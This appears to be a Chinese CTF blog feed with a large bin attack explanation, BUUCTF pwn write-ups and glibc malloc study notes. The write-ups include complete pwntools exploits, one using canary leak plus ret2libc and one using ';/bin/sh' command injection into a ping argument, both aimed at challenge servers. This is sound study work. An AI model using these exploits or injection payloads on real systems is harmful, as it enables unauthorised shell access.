<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>p2修改后</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1744390744972.png" alt="修改后"></p><p>74行，结合2.23源码进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//前情提要p2&lt;p3,p3要被放到largebin中,p2本就在largebin中</span><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><span class="hljs-comment">//进入这里的分支</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<span class="hljs-comment">//vivtim是unsortedbin中，即将被放入largebin中的堆块(p3),bwd是最近被放进largebin中的chunk(p2)，这一句将p3-&gt;fd_nextsize=p2</span><br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="hljs-comment">//p2-&gt;bk_nextsize被我们设置成stack_var-0x20的地址，所以p3-&gt;bk_nextsize指向它,p3-&gt;bk_nextsize=p2-&gt;bk_nextsize=stack_var2-0x20</span><br>                          fwd-&gt;bk_nextsize = victim;<span class="hljs-comment">//p2-&gt;bk_nextsize指向p3</span><br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//将stack_var2-0x20-&gt;fd_nextsize，也就是stack_var2的地址，将其变成p3头指针</span><br>                        &#125;<br>                      bck = fwd-&gt;bk;<span class="hljs-comment">//等价于(fwd-bk)-&gt;fd=victim 也就是stack_var1-0x10-&gt;fd=victim,修改了var1的值，流程走完，利用完毕!!</span><br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br></code></pre></td></tr></table></figure><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>主要利用两个chunk，大的p3，小的p2，通过伪造<code>p2-&gt;bk,p2-&gt;bk_nextsize</code>，分别指向<code>target-0x10,target-0x20</code>放到largebin里(在此之前largebin最好为空)，而大堆块malloc后进入largebin，<strong>实现将p3头指针赋值给target1,target2</strong></p><p>how2heap 中也说了，large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件：</p><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li><li>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</li><li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li></ul>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu做题记录</title>
    <link href="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf-2020-babyrop2"></a>bjdctf-2020-babyrop2</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1738725643074.png" alt="checksec"></p><p>可以看到有开canary，可能需要绕过</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1738725725804.png" alt="IDA"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">gift</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(byte_400A05);<br>  fflush(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>看到有格式化字符串漏洞，可以利用来泄露canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64u</span>LL);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在栈溢出</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先利用格式化字符串来泄露canary，由于是64位，栈上数据是从%6&amp;p起</p><ul><li>利用gdb查看canary位置</li></ul><p>发现在栈上第二个，也就是%7$p，所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>r.recvuntil(<span class="hljs-string">b&#x27;help u!\n&#x27;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<span class="hljs-comment"># 将16进制字符串转换为整数</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:  &quot;</span>,<span class="hljs-built_in">hex</span>(canary))<br></code></pre></td></tr></table></figure><ul><li>接着ret2libc</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)<br>payload+=p64(vuln_addr)<br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>r.sendline(payload)<br></code></pre></td></tr></table></figure><p>然后公式计算libc基地址，system，&#x2F;bin&#x2F;sh地址，再进行一次栈溢出即可</p><ul><li>完整脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;AMD64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bbrop2&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29194</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bbrop2&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23_64.so&#x27;</span>)<br>vuln_addr=<span class="hljs-number">0x400887</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>ret_addr=<span class="hljs-number">0x4005f9</span><br>rdi_addr=<span class="hljs-number">0x400993</span><br><span class="hljs-comment">#gdb.attach(r)</span><br>payload=<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>r.recvuntil(<span class="hljs-string">b&#x27;help u!\n&#x27;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:  &quot;</span>,<span class="hljs-built_in">hex</span>(canary))<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)<br>payload+=p64(vuln_addr)<br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>r.sendline(payload)<br><br>puts_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr=&quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(sys_addr)<br>payload+=p64(vuln_addr)<br>r.sendline(payload)<br><span class="hljs-comment">#pause()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h1><h2 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1739949705480.png" alt="checkec"></p><h2 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1739949773628.png" alt="IDA"></p><p>在case: 1时就有了system，主要就是利用这个system</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>利用case: 1里的函数：</p><ul><li>strcat是将字符串拼接到目标字符串后，dest处本来存在’ping’，<strong>我们要接一个&#x2F;bin&#x2F;sh在后头并且用分号隔开</strong>，这样才会分别执行两个命令，分别是system(“ping”)和system(“&#x2F;bin&#x2F;sh”)</li></ul><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#r=process(&#x27;./br&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28295</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Please input u choose:\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Please input the ip address:\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;;/bin/sh\x00&#x27;</span><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码学习</title>
    <link href="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="5-1边界标记法"><a href="#5-1边界标记法" class="headerlink" title="5.1边界标记法"></a>5.1边界标记法</h1><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175742174.png" alt="1"></p><ul><li>size_t 32位下4字节，64位下4字节或8字节</li><li>分配chunk必须与2*SIZE_SZ(size_t)对齐</li><li>倒三倒四的#是用来处理chunk地址对齐的宏</li><li><strong>&#x3D;&#x3D;32平台下chunk地址按8字节对齐，64位按8字节或16字节对齐&#x3D;&#x3D;</strong></li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175983933.png" alt="2"></p><p>使用结构体来描述这些chunk</p><ul><li>prev_size：前一个块是<strong>空闲时</strong>，表示前一个块大小，若不空闲则无意义</li><li>size：记录<strong>当前chunk大小和当前的和前一个chunk一些属性</strong>：是否在使用中、当前chunk是否是通过mmap分配，当前chunk是否属于主分配去</li><li>fd,bk：<strong>当前chunk空闲时</strong>存在的两个指针，用于链表管理，若已分配，则<strong>作为应用程序的使用空间</strong></li><li>fd_nextsize,bk_nextsize：当前chunk存在与large bins中时， fd_nextsize 指向下一个比当前 chunk 大小 &#x3D;&#x3D;大&#x3D;&#x3D;的第一个空闲 chunk，bk_nextszie 指向前一个比当前 chunk 大小&#x3D;&#x3D;小&#x3D;&#x3D;的第一个空闲 chunk ，<br>若已分配，则也作为<strong>程序的使用空间</strong><ul><li><strong>Fast Bins</strong>：用于管理小内存块（通常小于 64 字节），采用单链表结构，分配和释放速度较快。</li><li><strong>Small Bins</strong>：用于管理中等大小的内存块（通常小于 512 字节），采用双向链表结构。</li><li><strong>Large Bins</strong>：用于管理较大的内存块（通常大于 512 字节），采用双向链表结构，并按大小排序。</li><li><strong>Unsorted Bins</strong>：用于临时存放释放的内存块，后续会根据大小将其移动到 <code>small bins</code> 或 <code>large bins</code>。</li></ul></li></ul><p>已分配的</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739176396167.png" alt="3"></p><p>free中的</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739176416592.png" alt="4"></p><p>可以看到已分配中的fd和bk作为了程序可以使用的空间</p><ul><li>通过 <code>mmap</code> 分配的块，在它们的大小字段中设置了第二低的位 M（IS_MMAPPED）。因为它们是one by one分配的，所以每个块都必须包含自己的尾随大小字段，是独立于堆的。</li><li>P（PREV_INUSE）位存储在块大小的未使用的最低位中 ，标记前一个块是否被使用，1 使用，0 空闲。<strong>状态为0时</strong>，当前chunk包含前一个chunk大小及位置。第一个chunk总是被设置，防止访问错误</li><li>特殊块 <code>top</code> 不使用尾随大小字段，因为<strong>没有下一个连续块</strong>需要通过它来索引。在初始化后，<code>top</code> 始终存在。如果它变得小于 MINSIZE 字节长，它会被重新填充。</li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739178289931.png" alt="5"></p><ul><li>chunk2mem：通过chunk地址获得返回<strong>给用户</strong>内存地址（mem的地址）</li><li>mem2chunk：通过mem的地址<strong>得到chunk的地址</strong></li><li>mem地址同样2*SIZE_SZ对齐（前两个域刚好是2*SIZE_SZ大小）</li><li>宏 aligned_OK 和 misaligned_chunk(p)用于校验地址是否是按 2*SIZE_SZ 对齐的 </li><li>MIN_CHUNK_SIZE 定义了<strong>最小的</strong> chunk 的大小，<strong>32 位平台上位 16 字节，64 位平台为 24 字节或是 32 字节</strong> </li><li>MINSIZE是最小的分配的内存大小</li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739247145745.png" alt="6"></p><p>这几个宏将用户请求的大小转换为实际上需要分配的大小</p><ul><li><p>在linux X86_64平台中，假设SIZE_SZ为8字节，空闲时，一个chunk至少要有4<em>size_t空间（来存储prev_size,size,fd,bk）也就是*<em>MINSIZE（32B）</em></em></p></li><li><p>可以看到转换时不但考虑地址对齐，还<strong>额外加上了SIZE_SZ</strong>，原因：</p><p>对于一个使用中的chunk，其下一个chunk的pre_size处于无效的，可以被当前chunk所使用，所以<strong>in_use_size&#x3D;(用户请求大小 +16(pre_size+size)-8(借了下一个chunk的pre_size)) align to 16B</strong></p><p>又因为空闲时的chunk和使用中的chunk使用的是同一块空间，所以取最大者为实际分配的空间，所以最终chunk_size&#x3D;max(in_use_size,32(MINSIZE))</p></li><li><p>如果chunk由mmap直接分配，就不会有前一个和后一个chunk，所以借不到下一个chunk的pre_size，所以overhead&#x3D;2*SIZE_SZ</p></li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739264274475.png" alt="7"></p><p>chunk分割时总是以地址对齐（默认8字节，但也可以自己设置（alignment&#x3D;2^n,  n是整数且n&gt;&#x3D;3））所以chunk-&gt;size末3bit总是0，比如说8的二进制为1000，用来存储其他信息：</p><ul><li>第0位作为P状态位，记录前一chunk是否在使用中 1使用，0空闲</li><li>第1位M状态位，标记本chunk是否是mmap分配，1是0否</li><li>第2位A状态位，标记本chunk是否属于<strong>非主分配区</strong>，1是0否</li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739267841775.png" alt="8"></p><ul><li>pre_size记录的信息：<ul><li>前一个chunk空闲，pre_size记录前一个chunk的大小，这就是通过当前chunk指针获得前一个空闲chunk<strong>地址</strong>的依据，宏prev_chunk(p)就是这样实现的</li><li>前一个chunk在使用中。pre_size无意义</li></ul></li><li>size记录本chunk大小，可通过本chunk大小+本chunk地址得到下一个chunk的地址，由于size低三位记录控制信息，取出实际size在计算时需要注意。这是next_chunk(p)实现原理</li><li>chunksize(p)用于获得chunk实际大小，需要屏蔽size中控制信息</li><li>chunk_at_offset(p,s)将p+s地址强制看作一个chunk<ul><li>p是当前chunk地址</li><li>作用<ul><li>获取相邻chunk</li><li>合并空闲chunk</li><li>遍历堆内存</li></ul></li></ul></li><li>注意，可以有多个连续并且正在使用中的chunk，但不会有多个连续空闲chunk（会合并为一个大的空闲chunk）</li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739271421329.png" alt="8"></p><p>这组宏用于check&#x2F;set&#x2F;clear当前chunk<strong>使用</strong>标志位，<strong>因为当前chunk信息存储在下一个chunk中</strong>，所以要先获取下一个chunk地址再操作</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739271511827.png" alt="9"></p><p>这三个用于check&#x2F;set&#x2F;clear<strong>指定chunk</strong>的size中的使用表示位</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739272311840.png" alt="10"></p><ul><li><strong><code>set_head_size(p, s)</code></strong>  设置当前 chunk 的 <code>size</code> 域，并保留标志位 </li><li><strong><code>set_head(p, s)</code></strong>  设置当前 chunk 的 <code>size</code> 域，并忽略标志位 </li><li><strong><code>set_foot(p, s)</code></strong>  设置下一个 chunk 的 <code>prev_size</code> 为当前 chunk 的大小</li></ul><h1 id="5-2分箱式内存管理"><a href="#5-2分箱式内存管理" class="headerlink" title="5.2分箱式内存管理"></a>5.2分箱式内存管理</h1><p>对于空闲的chunk，ptmalloc采用分箱式内存管理方式，将其放在4个不同的bin中</p><ul><li>fast bins<ul><li>小内存块的高速缓存，<strong>小于64字节</strong>的chunk被回收时，首先放入fast bins中，分配小内存时，首先会查看fast bins中是否有合适的，若有则直接返回以加快分配速度</li></ul></li><li>unsorted bin<ul><li>顾名思义，类似一个<strong>中转</strong>。临时存放刚释放的chunk，后续会存到small&#x2F;large bins中。用户请求是首先看这个bin，找到直接返回，没找到再看small&#x2F;large bins</li></ul></li><li>small bins<ul><li>存放固定大小的chunk，共64个bin，最小的chunk大小为16或32字节，每个bin大小<strong>相差8&#x2F;16字节</strong>， Small Bins[0] 管理 32 字节的 chunk，Small Bins[1] 管理 48 字节的 chunk，以此类推</li></ul></li><li>large bins<ul><li>存放大小大于等于512或1024B的空闲chunk，采用<strong>双向链表</strong></li></ul></li></ul><h2 id="5-2-1-Small-Bins"><a href="#5-2-1-Small-Bins" class="headerlink" title="5.2.1 Small Bins"></a>5.2.1 Small Bins</h2><p> Chunk_size&#x3D;2 * SIZE_SZ * index</p><ul><li><p>在 SIZE_SZ 为 4B 的平台（<strong>32位</strong>平台）上，small bins 中的 chunk 大小是以 <strong>8B</strong> 为公差的等差数列，<strong>最大的chunk大小为 504B</strong>，<strong>最小的 chunk 大小为 16B</strong>，所以实际共 62 个 bin。分别为 16B、24B、 32B,…,504B。在 SIZE_SZ 为 8B 的平台（<strong>64位</strong>）上，small bins 中的 chunk 大小是以 <strong>16B</strong> 为公差 的等差数列，<strong>最大的 chunk 大小为 1008B，最小的 chunk 大小为 32B</strong>，所以实际共 62 个 bin。</p></li><li><p>ptmalloc维护了62个双向环形链表，每个链表的空闲chunk的大小一直</p></li><li><p>下图为32位平台下ptmalloc的组织方式</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739551424330.png" alt="分箱式管理"></p></li></ul><h2 id="5-2-2large-bins"><a href="#5-2-2large-bins" class="headerlink" title="5.2.2large bins"></a>5.2.2large bins</h2><ul><li><p>SIZE_SZ为4B（32位）平台下，&gt;&#x3D;512B，或SIZE_SZ为8B（64位），&gt;&#x3D;1024B的空闲chunk，由large bins管理。一共包含63个bin，每个bin中的chunk大小<strong>不是</strong>固定公差的等差数列，而是分成 6 组 bin，<strong>每组 bin 是一个固定公差的等差数列</strong>，每组的 bin <strong>数量依次为 32、16、8、4、2、1，公差依次为 64B、512B、 4096B、32768B、262144B</strong> 等 </p></li><li><p>比如SIZE_SZ为4的平台，第一个large bin起始chunk大小为512B，共32bin，公差64B，所以Chunk_size&#x3D;512+64*index</p><p>第二个large bin从第一个结束开始，所以Chunk_size&#x3D;512+64<em>32+512</em>index，后面以此类推</p></li><li><p>可以看出large bins和small bins都有规律，我们可以将这两个bins放在同一个包含1<strong>28个chunk的数组上</strong>，前一部分为small bins</p></li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739610043953.png"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739610064636.png"></p><ul><li><p>这几个宏可以根据数组下标计算出该 bin 的 chunk <strong>大小（small bins）</strong>或是 chunk 大小<strong>范围（large bins）</strong>，也可以根据需要分配内存块大小计算出所需 chunk 所属 bin 的 index </p></li><li><p>bin_index(sz)根据所需内存大小计算出所需bin的index，再调用smallbin_index(sz)或者largebin_index(sz)</p></li><li><p>smallbin_index(sz)的计算：</p><ul><li>如果SIZE_SZ是4B，那么将sz&#x2F;4</li><li>如果SIZE_SZ是8B，那么将sz&#x2F;4</li></ul></li><li><p>large bins计算会复杂一点</p></li><li><p>在SIZE_SZ是4B的情况下，chunk大小和bin index：</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739639876879.png"></p></li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739639913107.png"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739639928725.png"></p><ul><li>对于 SIZE_SZ 为 4B 的平台，bin[0]和 bin[1]是<strong>不存在</strong>的，因为最小的 chunk 为 <strong>16B</strong>（fd,bk,pre_size,size），small  bins 一共 <strong>62</strong> 个，large bins 一共 <strong>63</strong> 个，加起来一共 <strong>125</strong> 个 bin。而 NBINS 定义为 128，<strong>其实 bin[0]和 bin[127]都不存在</strong>，bin[1]为 unsorted bin 的 chunk 链表头。 </li><li>对于用户要分配的size，要先用,checked_request2size(req,sz)，计算出chunk大小再用bin_index(sz)计算出所属的bin_index</li></ul><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739689213477.png"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739689225241.png"></p><ul><li>bin_at(m,i)通过bin index获得bin的链表头，chunk的fd，bk将空闲chunk链入链表，对于bin的链表头，只需要存储fd，bk即可，size和pre_size对链表来说无意义，所以为了节省空间和提高速度，<strong>每个bin只留了fd和bk的空间</strong></li><li>bin_at(m,i)：<strong>定义</strong>看出bin[0]不存在</li><li>在SIZE_SZ是4B的平台,bin[1]前4B存fd，后4B存bk，bin_at返回malloc_chunk的指针，由于fd在malloc_chunk的偏移地址是 offsetof (struct malloc_chunk, fd))&#x3D;8（前面有size和pre_size，加起来是8B），所以fd地址-8就是malloc_chunk的地址</li><li><strong>对 bin 的链表头的 chunk，一定不能修改 prev_size 和 size 域，这两个域是与其他 bin 的链表头的 fb 和 bk 内存复用的</strong> （其中存储的是fd和bk，若修改的话会破坏双向链表）</li><li>next_bin(b)用于获得下个bin地址：当前bin地址向后移动fd+bk的距离</li><li>bin的链表头的指针fd指向第一个chunk，bk指向最后一个，first(b)获取第一个可用chunk，last(b)获取最后一个可用chunk，这两个宏用于遍历bin</li><li>unlike(P,BK,FD)将chunk从空闲链表中取出来，注意large bins空闲chunk可能在<strong>两个双向链表</strong>中，unlike需要从两个中删除</li></ul><h2 id="5-2-3-Unsorted-bin"><a href="#5-2-3-Unsorted-bin" class="headerlink" title="5.2.3 Unsorted bin"></a>5.2.3 Unsorted bin</h2><ul><li><p>可看作small bins和large bins的cache（缓存），只有一个bin，以双向链表管理，不排序</p></li><li><p>所有chunk回收时首先放到该bin，如果该bin没合适的chunk，那么将该bin所有chunk加入到所属的bins中，然后再在small&#x2F;large bins分配合适的。bins数组中bin[1]用于存储unsorted bin的chunk链表头<br> <img src="/2025/01/18/%E5%A4%87%E6%B3%A8/loc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739699575792.png"></p></li></ul><p> <img 